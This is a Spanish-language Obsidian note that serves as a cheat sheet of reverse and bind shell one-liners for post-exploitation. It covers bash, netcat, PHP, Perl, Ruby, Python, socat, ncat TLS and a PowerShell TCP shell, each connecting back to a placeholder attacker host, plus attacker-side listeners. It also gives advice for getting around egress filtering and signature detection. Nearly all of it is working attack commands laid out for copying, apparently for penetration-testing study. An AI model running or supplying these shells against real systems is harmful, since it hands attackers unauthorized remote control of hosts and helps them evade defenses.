---
tipo: meta
aliases:
  - Reverse shells - matriz
  - Bind shells - matriz
  - reverse shell cheatsheet
  - bind shell cheatsheet
tags:
  - meta/referencia
  - dominio/post-explotacion
---

# Reverse y bind shells - matriz de referencia

> [!info] Referencia pura, no un zettel
> El criterio —reverse vs bind vs webshell— vive en [[MOC - Shells]], [[Shell - conexión reversa]] y [[Shell - conexión bind]]. Promover a TTY: [[Estabilización de shell - matriz de referencia]]. Payloads generados: [[msfvenom - matriz de referencia]]. Sin socket posible (comando por HTTP): [[Webshells - matriz de referencia]].

> [!warning] Cuadros anchos a propósito
> Los one-liners superan el ancho de la ventana. Scrolleá horizontal o apagá el ajuste con `<leader>uw`. Los `|` de las tuberías van escapados como `\|` para no romper la tabla; al copiar y pegar, son `|` normales.

`ATACANTE` = tu IP, `PUERTO` = tu puerto de escucha (usá **443** o **80**: son los que casi siempre salen). Sin datos de objetivo real — regla del vault.

## Cuál usar según el objetivo
No trae comandos: decide **cuál de los de abajo** copiar, según lo que haya en la víctima.

| Situación | Cuál usar |
|---|---|
| Hay `bash` | bash base; envolver con `setsid` si muere con la petición |
| Hay `python3` | versión completa de Python — **trae TTY**, salta la estabilización |
| Hay `socat` en ambos lados | versión completa de socat — TTY completo y cifrable de una |
| Solo `nc` sin `-e` | el truco del `mkfifo` |
| Contenedor mínimo (solo `sh`) | `/dev/tcp` si `sh` enlaza a bash; si no, `mkfifo` |
| Egress inspecciona TLS / en claro no vuelve | versión completa de `ncat --ssl` |
| Egress cerrado, ingress local abierto | bind shell (§ más abajo) |
| Windows | PowerShell; `-enc` si hay filtro de firma |
| Necesitás `.exe`/`.dll` o Meterpreter | [[msfvenom - matriz de referencia]] |


## Reverse shells (Linux) — el objetivo conecta hacia vos
One-liner base. Abre una dumb shell; muere con la petición si no se desacopla, y sin TTY (ver limitaciones en [[Estabilización de shell - matriz de referencia]]).

| Lenguaje | One-liner base | Requiere |
|---|---|---|
| bash | `bash -i >& /dev/tcp/ATACANTE/PUERTO 0>&1` | `bash` real, no `sh` |
| sh + nc (sin `-e`) | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|sh -i 2>&1\|nc ATACANTE PUERTO >/tmp/f` | `nc` de cualquier distro; deja FIFO en `/tmp` |
| nc (con `-e`) | `nc -e /bin/sh ATACANTE PUERTO` | `netcat-traditional` (raro) |
| php | `php -r '$s=fsockopen("ATACANTE",PUERTO);exec("/bin/sh -i <&3 >&3 2>&3");'` | `php` (garantizado en server web) |

**Perl y Ruby** — la misma dumb shell base, pero el one-liner es demasiado largo para el cuadro:
- `perl -e 'use Socket;$i="ATACANTE";$p=PUERTO;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`
Perl. Presente en sistemas viejos donde no hay Python 3.
- `ruby -rsocket -e'f=TCPSocket.open("ATACANTE",PUERTO).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
Ruby. Cuando el stack es Rails.
**Versiones completas** — TTY, cifrado, o que sobreviven a la petición:
- `setsid bash -c 'bash -i >& /dev/tcp/ATACANTE/PUERTO 0>&1' &`
Desacopla la shell del proceso de la petición con `setsid` + `&`: no muere cuando el server responde. Lo primero que se prueba cuando la reversa cae al instante.
- `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATACANTE",PUERTO));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'`
Python con `pty.spawn`: **ya trae TTY**, salta toda la estabilización. La mejor opción si hay Python.
- `socat TCP:ATACANTE:PUERTO EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane`
socat con `pty`: **TTY completo directo**, maneja `Ctrl-C` y señales. Requiere `socat` en el objetivo y un listener socat (§ listeners).
- `ncat --ssl ATACANTE PUERTO -e /bin/bash`
ncat con TLS: **cifra el canal** y evade inspección en claro. Par de `ncat --ssl -lvnp PUERTO` del lado atacante.

## Bind shells (Linux) — el objetivo escucha, vos conectás
Escuchan en el objetivo; conectás con `nc TARGET PUERTO`. Solo con puerto entrante alcanzable — ver [[Shell - conexión bind]].

| Lenguaje | One-liner base (en el objetivo) | Requiere |
|---|---|---|
| nc (con `-e`) | `nc -lvnp PUERTO -e /bin/bash` | `netcat-traditional` |
| sh + nc (sin `-e`) | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc -lvnp PUERTO >/tmp/f` | `nc` de cualquier distro |

**Versiones completas:**
- `socat TCP-L:PUERTO,reuseaddr,fork EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane`
socat en escucha: **TTY completo**; `fork` acepta reconexiones y `reuseaddr` evita el "address already in use" al reintentar.
- `python3 -c 'import os,pty,socket;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",PUERTO));s.listen(1);c,_=s.accept();[os.dup2(c.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'`
Bind en Python: **trae TTY** y no depende de `nc`.

## Windows
One-liner base:

| Intérprete | One-liner base | Nota |
|---|---|---|
| nc.exe (reverse) | `nc.exe ATACANTE PUERTO -e cmd.exe` | Subir `nc.exe` primero — [[Traer herramientas al objetivo]] |
| nc.exe (bind) | `nc.exe -lvnp PUERTO -e cmd.exe` | Abre puerto en escucha |

**Versión completa** — PowerShell sin binario que subir:
- `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATACANTE',PUERTO);$s=$c.GetStream();[byte[]]$b=0..65535\|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1\|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length);$s.Flush()}"`
Reverse shell nativa de PowerShell, no necesita `nc.exe`. Si hay filtro de firma, codificarla entera con `-enc` (base64 de la cadena en UTF-16LE). Windows no tiene el TTY de Unix; para consola con historial, subir a Meterpreter/WinRM ([[metasploit]]) o `ConPTY`.

## Del lado del atacante — listeners

| Herramienta | Comando | Qué aporta |
|---|---|---|
| nc | `nc -lvnp PUERTO` | El básico. No maneja TTY, se muere con un `Ctrl-C` mal dado |
| ncat (TLS) | `ncat --ssl -lvnp PUERTO` | Atrapa la reversa cifrada; par del `ncat --ssl` del objetivo |
| rlwrap + nc | `rlwrap nc -lvnp PUERTO` | Edición de línea, historial y flechas en una dumb shell |
| socat (TTY) | `socat file:$(tty),raw,echo=0 TCP-L:PUERTO` | Terminal cruda del lado atacante — la mitad de la estabilización socat |
| pwncat-cs | `pwncat-cs -lp PUERTO` | **Estabiliza sola** (TTY, historial), sube/baja archivos, persiste |
| msfconsole | `exploit/multi/handler` | Para payloads de msfvenom — setup en [[msfvenom - matriz de referencia]] |


## Errores frecuentes

| Síntoma | Causa | Salida |
|---|---|---|
| Conecta y se cae al instante | `sh` no soporta `>&` de bash | usar el `mkfifo`, o invocar `bash -c` |
| La shell muere al responder el server | atada al proceso de la petición | envolver con `setsid ... &` (§ versiones completas) |
| `Ctrl-C` mata toda la sesión | dumb shell sin TTY | versión con `pty` (python/socat), o estabilizar |
| No conecta a puerto alto | egress filtra ese puerto | probar 443 / 80 |
| Reversa en claro no vuelve | egress solo por proxy / inspección TLS | `ncat --ssl` o túnel por el proxy |
| Bind no es alcanzable | NAT / firewall perimetral / firewall de host | usar reversa, o abrir el puerto tras el pivote |

